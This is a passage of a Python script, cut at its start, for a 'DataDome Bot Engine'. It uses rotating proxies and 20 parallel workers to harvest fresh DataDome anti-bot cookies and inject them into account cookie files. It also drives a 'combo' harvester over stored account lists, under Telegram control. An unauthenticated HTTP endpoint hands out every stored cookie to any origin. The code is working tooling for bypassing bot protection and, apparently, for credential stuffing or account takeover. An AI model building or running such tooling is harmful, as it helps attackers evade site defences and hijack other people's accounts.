            self.send_important(f"❌ Error: {e}", chat_id)

    def _handle_cookie_file_upload(self, chat_id, file_id, fname):
        try:
            content, _ = self._download_tg_file(file_id)
            if content is None:
                self.send_important("❌ Could not retrieve file from Telegram.", chat_id)
                return
            lines = list(self._iter_valid_lines(content))
            total_in_file = len(lines)
            if not lines:
                self.send_important(f"❌ File <b>{fname}</b> is empty or has no valid cookies.", chat_id)
                return
            # Auto-cut at 500 lines
            trimmed = False
            if total_in_file > self._MAX_COOKIE_LINES:
                lines = lines[:self._MAX_COOKIE_LINES]
                trimmed = True
            self.updater.write_cookie("\n".join(lines))
            count = len(self.updater.read_all_cookies())
            logger.info(f"[TG] Cookie file uploaded: {fname} ({count} lines) from {chat_id}")
            trim_note = (
                f"\n⚠️ File had <b>{total_in_file:,}</b> lines — auto-cut sa <b>{self._MAX_COOKIE_LINES}</b>"
                if trimmed else ""
            )
            self.send_important(
                f"✅ <b>Cookie file loaded!</b>\n\n"
                f"🍪 Cookies loaded: <b>{count}</b>{trim_note}\n\n"
                f"Lahat ng {count} cookies ay awtomatikong maa-update ng\n"
                f"fresh datadome sa bawat successful fetch — <b>walang reload needed!</b>\n\n"
                f"📡 API: <code>/cookie</code> → lahat ng {count} lines, live na ang datadome.",
                chat_id
            )
        except Exception as e:
            logger.warning(f"[TG] Cookie upload error: {e}")
            self.send_important(f"❌ Error: {e}", chat_id)

    def run_polling(self, shutdown_event):
        """Run polling loop in background thread."""
        if not self.token:
            logger.info("[TG] No BOT_TOKEN set — Telegram bot disabled")
            return
        logger.info("[TG] Starting Telegram bot polling...")
        while not shutdown_event.is_set():
            self.poll()
            shutdown_event.wait(1)

#  HTTP API  (raw link for monitoring)
# ═══════════════════════════════════════════════════════════════
class APIHandler(BaseHTTPRequestHandler):
    """HTTP API endpoints for monitoring."""

    # Class-level references (set by main)
    _updater = None
    _scanner = None
    _stats_ref = None
    _fetcher = None

    def log_message(self, format, *args):
        pass  # Suppress default HTTP logging

    def do_GET(self):
        path = urllib.parse.urlparse(self.path).path

        if path == "/" or path == "/datadome":
            # Raw datadome value (plain text) — 5000 char limit
            dd = self._updater.read_current_datadome() if self._updater else None
            self._text_response((dd or "NONE")[:5000])

        elif path == "/cookie" or path == "/cookies":
            # ALL cookie lines — every account, datadome already fresh (no reload needed)
            # One full cookie per line, plain text
            lines = self._updater.read_all_cookies() if self._updater else []
            content = "\n".join(lines) if lines else "NONE"
            self._text_response(content)

        elif path == "/stats":
            # JSON stats
            stats = self._stats_ref.get_stats() if self._stats_ref else {}
            file_stats = self._scanner.get_file_stats() if self._scanner else {}
            stats["proxy_files"] = file_stats
            stats["total_proxies"] = self._scanner.total if self._scanner else 0
            self._json_response(stats)

        elif path == "/proxylist":
            # List proxy files
            files = self._scanner.list_files() if self._scanner else []
            file_stats = self._scanner.get_file_stats() if self._scanner else {}
            self._json_response({"files": files, "counts": file_stats, "total_proxies": self._scanner.total if self._scanner else 0})

        elif path == "/fetch":
            # One-shot fetch + update via API
            result = self._fetcher.fetch() if self._fetcher else {"success": False, "error": "Not initialized"}
            if result.get("success"):
                update = self._updater.update_datadome(result["datadome"]) if self._updater else {"success": False}
                result["update"] = update
                if self._stats_ref:
                    self._stats_ref.record_fetch(True, result.get("latency_ms", 0), update.get("success", False))
            else:
                if self._stats_ref:
                    self._stats_ref.record_fetch(False)
            self._json_response(result)

        elif path == "/health":
            self._json_response({"status": "ok", "uptime": datetime.now().isoformat()})

        else:
            self._json_response({"error": "Unknown endpoint", "endpoints": ["/", "/datadome", "/cookie", "/stats", "/proxylist", "/fetch", "/health"]}, 404)

    def do_POST(self):
        path = urllib.parse.urlparse(self.path).path

        if path == "/cookie":
            # Set cookie via API
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length > 0 else ""
            if body.strip():
                self._updater.write_cookie(body.strip()) if self._updater else None
                self._json_response({"success": True, "message": "Cookie updated"})
            else:
                self._json_response({"error": "Empty body"}, 400)

        elif path == "/proxy/add":
            # Add proxy via API: {"file": "us.txt", "proxy": "1.2.3.4:8080"}
            length = int(self.headers.get("Content-Length", 0))
            body = self.rfile.read(length).decode("utf-8") if length > 0 else "{}"
            try:
                data = json.loads(body)
                fname = data.get("file", "default.txt")
                proxy = data.get("proxy", "")
                if proxy:
                    self._scanner.add_proxy_to_file(fname, proxy) if self._scanner else None
                    self._json_response({"success": True, "total_proxies": self._scanner.total if self._scanner else 0})
                else:
                    self._json_response({"error": "No proxy provided"}, 400)
            except json.JSONDecodeError:
                self._json_response({"error": "Invalid JSON"}, 400)

        else:
            self._json_response({"error": "Unknown endpoint"}, 404)

    def _text_response(self, text):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(text.encode("utf-8"))

    def _json_response(self, data, code=200):
        self.send_response(code)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data, indent=2).encode("utf-8"))


# ═══════════════════════════════════════════════════════════════
#  STATS TRACKER
# ═══════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self._stats = {
            "fetched": 0,
            "updated": 0,
            "failed": 0,
            "avg_latency_ms": 0,
            "total_latency_ms": 0,
            "latency_count": 0,
            "started_at": datetime.now().isoformat(),
        }
        self._lock = threading.Lock()

    def record_fetch(self, success, latency_ms=0, updated=False):
        with self._lock:
            if success:
                self._stats["fetched"] += 1
                if updated:
                    self._stats["updated"] += 1
                if latency_ms > 0:
                    self._stats["total_latency_ms"] += latency_ms
                    self._stats["latency_count"] += 1
                    self._stats["avg_latency_ms"] = int(
                        self._stats["total_latency_ms"] / self._stats["latency_count"]
                    )
            else:
                self._stats["failed"] += 1

    def get_stats(self):
        with self._lock:
            return dict(self._stats)


# ═══════════════════════════════════════════════════════════════
#  DATADOME POOL  — multi-value pool with smart inject flow
#
#  Logic:
#   1. /setdatadome val1, val2, val3  → inject multiple fresh DDs
#   2. On inject: pause fetch workers → 1 validation thread confirms
#      each DD works → replace old expired values → resume full speed
#   3. Workers round-robin across all valid DD values in pool
#   4. Expired DDs are auto-retired (tracked per-value success rate)
# ═══════════════════════════════════════════════════════════════
class DataDomePool:
    """
    Manages a pool of DataDome values.
    - Holds multiple DD values; workers pick the freshest one round-robin
    - On manual inject (/setdatadome): pauses workers, validates the new
      value(s) with a single probe request, then resumes at full speed
    - Tracks failure count per-value so stale DDs get retired automatically
    """

    def __init__(self, updater: "CookieUpdater"):
        self.updater = updater
        self._lock = threading.Lock()
        # Each entry: {"value": str, "failures": int, "injected_at": float}
        self._pool: list[dict] = []
        self._idx = 0
        # Event that fetch workers wait on — cleared = workers paused
        self.ready = threading.Event()
        self.ready.set()   # start unpaused
        self._inject_lock = threading.Lock()  # only one inject at a time

    # ── Pool reads ─────────────────────────────────────────────
    def get_best(self) -> str | None:
        """Return the current best DD value (fewest failures, most recent)."""
        with self._lock:
            if not self._pool:
                return self.updater.read_current_datadome()
            # Pick the entry with fewest failures (stable round-robin within tie)
            best = min(self._pool, key=lambda e: e["failures"])
            return best["value"]

    def record_success(self, value: str):
        """Called when a fetch succeeds — resets failure counter for this DD."""
        with self._lock:
            for e in self._pool:
                if e["value"] == value:
                    e["failures"] = 0
                    return

    def record_failure(self, value: str):
        """Called when a fetch fails — increments failure counter; retires at 5."""
        with self._lock:
            for e in self._pool:
                if e["value"] == value:
                    e["failures"] += 1
                    if e["failures"] >= 5:
                        logger.info(f"[POOL] 🗑 Retiring expired DD: {value[:20]}...")
                        self._pool.remove(e)
                    return

    def size(self) -> int:
        with self._lock:
            return len(self._pool)

    # ── Inject ─────────────────────────────────────────────────
    def inject(self, raw_values: str, fetcher: "DataDomeFetcher",
               notify_fn=None) -> dict:
        """
        Parse comma-separated DD values, pause workers, validate each with
        a single probe fetch, replace cookie file, then resume workers.

        Returns {"injected": [values], "failed": [values]}
        """
        # Parse — support both comma and newline separators
        parts = [v.strip() for v in raw_values.replace("\n", ",").split(",") if v.strip()]
        # Strip datadome= prefix if user pasted the full field
        cleaned = []
        for p in parts:
            if p.lower().startswith("datadome="):
                p = p.split("=", 1)[1].strip()
            if len(p) >= 20:
                cleaned.append(p)

        if not cleaned:
            return {"injected": [], "failed": [], "error": "No valid values found"}

        with self._inject_lock:
            # ── Step 1: Pause fetch workers ───────────────────
            logger.info(f"[POOL] ⏸ Pausing {NUM_WORKERS} workers for DD inject ({len(cleaned)} value(s))...")
            self.ready.clear()
            if notify_fn:
                notify_fn(
                    f"⏸ <b>Pausing workers</b> to inject {len(cleaned)} fresh DataDome value(s)...\n"
                    f"🔍 Validating with 1 probe thread — will resume full speed after."
                )

            injected = []
            failed   = []

            try:
                # ── Step 2: Validate each value with 1 fetch ──
                for dd_val in cleaned:
                    # Temporarily write this DD into cookie so fetcher uses it
                    self.updater.update_datadome(dd_val)
                    result = fetcher.fetch(thread_id=None)   # single probe

                    if result.get("success"):
                        # Good — add to pool (or update if already present)
                        with self._lock:
                            existing = next((e for e in self._pool
                                             if e["value"] == dd_val), None)
                            if existing:
                                existing["failures"] = 0
                                existing["injected_at"] = time.time()
                            else:
                                self._pool.append({
                                    "value": dd_val,
                                    "failures": 0,
                                    "injected_at": time.time(),
                                })
                        injected.append(dd_val)
                        logger.info(f"[POOL] ✅ Validated DD: {dd_val[:20]}... — added to pool")
                    else:
                        failed.append(dd_val)
                        logger.warning(
                            f"[POOL] ❌ DD failed probe: {dd_val[:20]}... "
                            f"({result.get('error','?')})"
                        )

                # ── Step 3: Write the freshest valid DD to cookie ──
                if injected:
                    self.updater.update_datadome(injected[0])
                elif failed and not injected:
                    # All failed — restore whatever was there before
                    pass

            finally:
                # ── Step 4: Resume all workers ─────────────────
                self.ready.set()
                pool_size = self.size()
                logger.info(
                    f"[POOL] ▶ Workers resumed — pool has {pool_size} DD value(s) "
                    f"({len(injected)} injected, {len(failed)} failed)"
                )

            return {"injected": injected, "failed": failed}


class DataDomeBotEngine:
    """Main engine: continuous fast fetch loop + Telegram + API."""

    def __init__(self):
        self.shutdown_event = threading.Event()
        self.stats = Stats()

        # Proxy scanner (auto-detect .txt in folder)
        self.scanner = ProxyScanner(PROXY_FOLDER, rescan_every=5)

        # Cookie updater
        self.updater = CookieUpdater(COOKIE_FILE)

        # Fetcher (no interval — as fast as possible)
        self.fetcher = DataDomeFetcher(self.scanner, max_retries=MAX_RETRIES, timeout=TIMEOUT)

        # DataDome pool (multi-value, smart inject)
        self.dd_pool = DataDomePool(self.updater)

        # Combo manager + stats
        self.combo_manager = ComboManager(COMBO_FOLDER)
        self.combo_stats   = ComboStats()

        # Combo harvester
        self.combo_harvester = ComboHarvester(
            self.combo_manager, self.scanner, self.updater, self.combo_stats
        )

        # Telegram bot
        self.tg = TelegramBot(
            BOT_TOKEN, CHAT_ID, self.scanner, self.updater, self.fetcher, self.stats,
            combo_manager=self.combo_manager,
            combo_harvester=self.combo_harvester,
            combo_stats=self.combo_stats,
            dd_pool=self.dd_pool,
        )

        # HTTP API
        APIHandler._updater = self.updater
        APIHandler._scanner = self.scanner
        APIHandler._stats_ref = self.stats
        APIHandler._fetcher = self.fetcher

    def run(self):
        logger.info("=" * 50)
        logger.info("[BOT] 🛡 DataDome Bot Engine starting...")
        logger.info(f"[BOT] Proxy folder: {PROXY_FOLDER}")
        logger.info(f"[BOT] Combo folder: {COMBO_FOLDER}")
        logger.info(f"[BOT] Cookie file : {COOKIE_FILE}")
        logger.info(f"[BOT] API port    : {API_PORT}")
        logger.info(f"[BOT] Workers     : {NUM_WORKERS}")
        logger.info(f"[BOT] Delay       : {DELAY_MS}ms")
        logger.info(f"[BOT] Timeout     : {TIMEOUT*1000:.0f}ms")
        logger.info("=" * 50)

        # Show initial status
        files = self.scanner.list_files()
        file_stats = self.scanner.get_file_stats()
        for f, c in file_stats.items():
            logger.info(f"[BOT] 📄 {f}: {c} proxies")
        logger.info(f"[BOT] 🔄 Total proxies: {self.scanner.total}")
        logger.info(f"[BOT] 🎯 Total accounts: {self.combo_manager.total}")

        current_dd = self.updater.read_current_datadome()
        if current_dd:
            short = current_dd[:40] + "..." if len(current_dd) > 40 else current_dd
            logger.info(f"[BOT] 🍪 Current datadome: {short}")

        # Start HTTP API server in background thread
        api_thread = threading.Thread(target=self._run_api, daemon=True)
        api_thread.start()

        # Start Telegram polling in background thread
        tg_thread = threading.Thread(target=self.tg.run_polling, args=(self.shutdown_event,), daemon=True)
        tg_thread.start()

        # Single startup message — wait briefly so polling is ready
        time.sleep(1.5)
        self.tg.send_important(
            f"🛡 <b>DataDome Bot started!</b>\n\n"
            f"🔄 Proxies: {self.scanner.total} | Workers: {NUM_WORKERS}\n"
            f"🎯 Accounts: {self.combo_manager.total}\n\n"
            f"Use the buttons below to navigate."
        )

        # Wait for proxies if none loaded
        if self.scanner.total == 0:
            logger.warning("[BOT] ⚠ No proxies loaded — waiting...")
            self.tg.send_important("⚠ DataDome Bot started but no proxies found!\n\nAdd proxies via:\n/proxyadd us.txt 1.2.3.4:8080\n\nOr add .txt files to the proxy folder.")
            while not self.shutdown_event.is_set():
                self.scanner.rescan()
                if self.scanner.total > 0:
                    logger.info(f"[BOT] ✔ {self.scanner.total} proxies loaded — starting!")
                    self.tg.send_important(f"✅ {self.scanner.total} proxies loaded — fetch loop starting!")
                    break
                self.shutdown_event.wait(10)

        if self.shutdown_event.is_set():
            return

        # Main fetch loop — 20 parallel workers
        logger.info(f"[BOT] 🚀 Starting {NUM_WORKERS}-worker parallel fetch loop...")
        cycle_counter = [0]
        cycle_lock = threading.Lock()
        last_stats_log = [time.time()]

        def worker_loop(thread_id):
            while not self.shutdown_event.is_set():
                # ── Pause gate — workers wait here during /setdatadome inject ──
                if not self.dd_pool.ready.is_set():
                    self.dd_pool.ready.wait(timeout=60)
                    if self.shutdown_event.is_set():
                        break

                if DELAY_MS > 0:
                    self.shutdown_event.wait(timeout=DELAY_MS / 1000.0)
                    if self.shutdown_event.is_set():
                        break

                result = self.fetcher.fetch(thread_id=thread_id)

                with cycle_lock:
                    cycle_counter[0] += 1

                if result["success"]:
                    dd = result["datadome"]
                    dd_short = dd[:30] + "..." if len(dd) > 30 else dd
                    update = self.updater.update_datadome(dd)
                    self.stats.record_fetch(True, result.get("latency_ms", 0), update.get("success", False))
                    self.dd_pool.record_success(dd)

                    if not BOT_MODE:
                        logger.debug(f"[BOT] ✔ {dd_short} | {result.get('latency_ms', 0)}ms | proxy: {result['proxy']}")

                    # ── Auto-notify via TelegramBot.auto_notify — guaranteed 1 msg per interval ──
                    stats = self.stats.get_stats()
                    self.tg.auto_notify(
                        f"🔄 <b>DataDome Live</b>\n"
                        f"✔ Fetched: {stats['fetched']} | ↻ Updated: {stats['updated']}\n"
                        f"⚡ Avg: {stats.get('avg_latency_ms', 0)}ms\n"
                        f"🔄 Proxies: {self.scanner.total} | Workers: {NUM_WORKERS}"
                    )
                else:
                    self.stats.record_fetch(False)
                    current_dd = self.dd_pool.get_best()
                    if current_dd:
                        self.dd_pool.record_failure(current_dd)
                    if not BOT_MODE:
                        logger.debug(f"[BOT] ✘ {result.get('error', '?')} | proxy: {result.get('proxy', '?')}")

                # ── Console stats log every 30s (one thread wins the lock) ──
                now = time.time()
                if now - last_stats_log[0] > 30:
                    with cycle_lock:
                        if now - last_stats_log[0] > 30:
                            last_stats_log[0] = now
                            s = self.stats.get_stats()
                            logger.info(
                                f"[BOT] 📊 {s['fetched']} fetched | {s['updated']} updated | "
                                f"{s['failed']} failed | avg: {s['avg_latency_ms']}ms"
                            )

        with ThreadPoolExecutor(max_workers=NUM_WORKERS, thread_name_prefix="ddworker") as pool:
            futures = [pool.submit(worker_loop, i) for i in range(NUM_WORKERS)]
            self.shutdown_event.wait()

        # Shutdown
        logger.info("[BOT] ⚠ Shutting down...")
        self.tg.send_important("⚠ DataDome Bot shutting down")
        s = self.stats.get_stats()
        logger.info(f"[BOT] 📊 Final: {s['fetched']} fetched | {s['updated']} updated | {s['failed']} failed")
        logger.info("[BOT] 👋 Goodbye!")

    def _run_api(self):
        """Run HTTP API server."""
        server = HTTPServer(("0.0.0.0", API_PORT), APIHandler)
        server.timeout = 1
        logger.info(f"[API] Listening on port {API_PORT}")
        while not self.shutdown_event.is_set():
            server.handle_request()

    def shutdown(self):
        self.shutdown_event.set()


# ═══════════════════════════════════════════════════════════════
#  SIGNAL HANDLER + MAIN
# ═══════════════════════════════════════════════════════════════
_engine = None

def _signal_handler(signum, frame):
    global _engine
    logger.info("[BOT] Shutdown signal received")
    if _engine:
        _engine.shutdown()

signal.signal(signal.SIGINT, _signal_handler)
signal.signal(signal.SIGTERM, _signal_handler)


def main():
    global _engine

    # Ensure directories exist
    os.makedirs(PROXY_FOLDER, exist_ok=True)
    os.makedirs(COMBO_FOLDER, exist_ok=True)
    cookie_dir = os.path.dirname(COOKIE_FILE)
    if cookie_dir:
        os.makedirs(cookie_dir, exist_ok=True)

    # Init from env vars (PROXIES, COOKIE)
    proxies_env = os.environ.get("PROXIES", "").strip()
    if proxies_env:
        proxies_list = [p.strip() for p in proxies_env.split(",") if p.strip()]
        if proxies_list:
            default_file = os.path.join(PROXY_FOLDER, "default.txt")
            if not os.path.exists(default_file):
                with open(default_file, "w") as f:
                    for p in proxies_list:
                        f.write(p + "\n")
                logger.info(f"[BOT] Wrote {len(proxies_list)} proxies from PROXIES env")

    cookie_env = os.environ.get("COOKIE", "").strip()
    if cookie_env:
        # Always overwrite — so updating the COOKIE env var on Railway
        # immediately takes effect on next deploy/restart
        with open(COOKIE_FILE, "w") as f:
            f.write(cookie_env + "\n")
        logger.info(f"[BOT] Wrote cookie from COOKIE env → {COOKIE_FILE}")

    _engine = DataDomeBotEngine()
    _engine.run()


if __name__ == "__main__":
    main()
